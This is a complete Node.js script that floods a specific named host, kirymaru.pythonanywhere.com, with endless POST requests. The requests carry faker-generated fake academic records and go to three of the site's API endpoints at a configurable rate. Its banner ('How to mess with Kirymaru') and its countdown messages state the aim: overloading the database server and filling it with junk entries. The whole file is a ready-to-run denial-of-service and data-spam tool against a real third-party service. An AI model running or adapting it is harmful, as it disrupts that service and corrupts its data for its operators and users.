require("dotenv").config();
const { faker } = require("@faker-js/faker");

function generateRawData1() {
  return JSON.stringify({
    nombre: faker.person.firstName(),
    apellidos: faker.person.lastName(),
    departamento: faker.commerce.department(),
    rev_bilio: faker.lorem.words(3),
    niv_act: faker.lorem.word(),
    total_asient: faker.number.int(),
    bd_local: faker.datatype.boolean(),
    cd_rom: faker.datatype.boolean(),
    bd_internet: faker.datatype.boolean(),
    curso_pos_bus: faker.datatype.boolean(),
    busqueda_internet: faker.datatype.boolean(),
    biblio_personal: faker.datatype.boolean(),
    otros: faker.datatype.boolean(),
    no_biblio: faker.datatype.boolean(),
    tomo: faker.lorem.word(),
    folio: faker.lorem.word(),
    pag: faker.lorem.word(),
    fecha: faker.date.future().toISOString().split("T")[0],
  });
}

function generateRawData2() {
  return JSON.stringify({
    nombre: faker.person.firstName(),
    apellidos: faker.person.lastName(),
    titulo_recurso: faker.lorem.words(3),
    departamento: faker.commerce.department(),
    lugar_pub: faker.location.city(),
    tomo: faker.lorem.word(),
    folio: faker.lorem.word(),
    tipo_publicacion: faker.lorem.word(),
    issn: faker.number.int({ min: 1000000000, max: 9999999999 }),
    e_issn: faker.number.int({ min: 1000000000, max: 9999999999 }),
    isbn: faker.number.int({ min: 1000000000000, max: 9999999999999 }),
    cdrom_dvd: faker.datatype.boolean(),
    base_de_datos: faker.datatype.boolean(),
    url: faker.internet.url(),
    tipo_recurso: faker.lorem.word(),
    fecha: faker.date.future().toISOString().split("T")[0],
    grupo: faker.lorem.word(),
  });
}

function generateRawData3() {
  return JSON.stringify({
    nombre: faker.person.firstName(),
    apellidos: faker.person.lastName(),
    titulo_recurso: faker.lorem.words(3),
    departamento: faker.commerce.department(),
    tomo: faker.lorem.word(),
    folio: faker.lorem.word(),
    fecha: faker.date.future().toISOString().split("T")[0],
  });
}

async function postData() {
  const requestOptions = {
    method: "POST",
    headers: new Headers({ "Content-Type": "application/json" }),
    redirect: "follow",
  };

  let iteration = 0;
  let i_x_sec = process.env.REQUESTS_PER_SECOND || 1;
  let fSuccess = 0;
  let AvPubSuccess = 0;
  let AvTutSuccess = 0;
  let AvBibSuccess = 0;
  let fFails = 0;

  while (true) {
    iteration++;
    const promises = [];

    for (let i = 0; i < i_x_sec; i++) {
      batchFails = 0;

      promises.push(
        fetch("https://kirymaru.pythonanywhere.com/api/avales_biblio/", {
          ...requestOptions,
          body: generateRawData1(),
        }).then((res) => {
          if (res.ok) AvPubSuccess++;
          return res;
        })
      );

      promises.push(
        fetch("https://kirymaru.pythonanywhere.com/api/profesores/", {
          ...requestOptions,
          body: generateRawData2(),
        }).then((res) => {
          if (res.ok) AvTutSuccess++;
          return res;
        })
      );

      promises.push(
        fetch("https://kirymaru.pythonanywhere.com/api/avales_tuto/", {
          ...requestOptions,
          body: generateRawData3(),
        }).then((res) => {
          if (res.ok) AvBibSuccess++;
          return res;
        })
      );
    }

    await Promise.all(promises)
      .catch((error) => {
        promises.forEach((promise, index) => {
          promise.catch(() => {
            batchFails++;
          });
        });
      })
      .finally(() => {
        fSuccess = AvPubSuccess + AvTutSuccess + AvBibSuccess;
        fFails += batchFails;
        batchSuccess = 3 * i_x_sec - batchFails;
        const colorize = (text, colorCode) =>
          `\x1b[${colorCode}m${text}\x1b[0m`;

        console.log(
          `Batch of ${colorize(
            iteration.toString().padStart(3, "0"),
            "36"
          )} requests for create completed [${colorize(
            batchSuccess.toString().padStart(1, "0"),
            "32"
          )}/${colorize(
            (3 * i_x_sec).toString().padStart(1, "0"),
            "32"
          )}];   Av.Pub: ${colorize(
            AvPubSuccess.toString().padStart(3, "0"),
            "33"
          )}   -   Av.Tut: ${colorize(
            AvTutSuccess.toString().padStart(3, "0"),
            "33"
          )}   -   Av.Bib: ${colorize(
            AvBibSuccess.toString().padStart(3, "0"),
            "33"
          )}        Total Fails : ${colorize(
            fFails.toString().padStart(2, "0"),
            "31"
          )}   Total Success : ${colorize(
            fSuccess.toString().padStart(3, "0"),
            "32"
          )}`
        );
      });
  }
}

console.log(
  "                _   _                 _          __  __                              \n" +
    " |\\/\\/\\/|      | | | | _____      __ | |_ ___   |  \\/  | ___  ___ ___                \n" +
    " |      |      | |_| |/ _ \\ \\ /\\ / / | __/ _ \\  | |\\/| |/ _ \\/ __/ __|               \n" +
    " | (o)(o)      |  _  | (_) \\ V  V /  | || (_) | | |  | |  __/\\__ \\__ \\               \n" +
    " C      _)     |_| |_|\\___/_\\_/\\_/    \\__\\___/  |_|  |_|\\___||___/___/               \n" +
    "  |  ___|     __      _(_) |_| |__   | |/ (_)_ __ _   _ _ __ ___   __ _ _ __ _   _  \n" +
    "  |   /       \\ \\ /\\ / / | __| '_ \\  | ' /| | '__| | | | '_ ` _ \\ / _` | '__| | | | \n" +
    " /____\\        \\ V  V /| | |_| | | | | . \\| | |  | |_| | | | | | | (_| | |  | |_| | \n" +
    "/      \\        \\_/\\_/ |_|\\__|_| |_| |_|\\_\\_|_|   \\__, |_| |_| |_|\\__,_|_|   \\__,_| \n" +
    " by @albertolicea00\n"
);
function countdown(callback) {
  console.log(
    ">>> Initiating overload of the database server with requests 🚀 in:"
  );
  setTimeout(() => {
    console.log("3");
    setTimeout(() => {
      console.log("2");
      setTimeout(() => {
        console.log("1");
        console.log("Starting request overload... 🚩");
        callback();
      }, 1500);
    }, 1000);
  }, 1000);
}
countdown(postData);
